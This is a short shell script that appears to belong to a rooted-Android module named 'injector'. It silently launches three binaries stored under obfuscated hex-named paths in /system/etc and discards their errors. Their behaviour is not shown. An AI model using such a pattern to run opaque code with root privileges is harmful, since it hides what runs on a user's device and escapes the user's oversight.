#!/system/bin/sh
MODDIR=${0%/*}
INFO=/data/adb/modules/.injector-files
MODID=injector
LIBDIR=/system
MODPATH=/data/adb/modules/injector
UID=a340e302
UID1=e5be246c
UID2=a197af4e
UID3=1fa1af3a
/system/etc/$UID/$UID1 2>/dev/null && /system/etc/$UID/$UID2 2>/dev/null && /system/etc/$UID/$UID3 2>/dev/null
exit 0

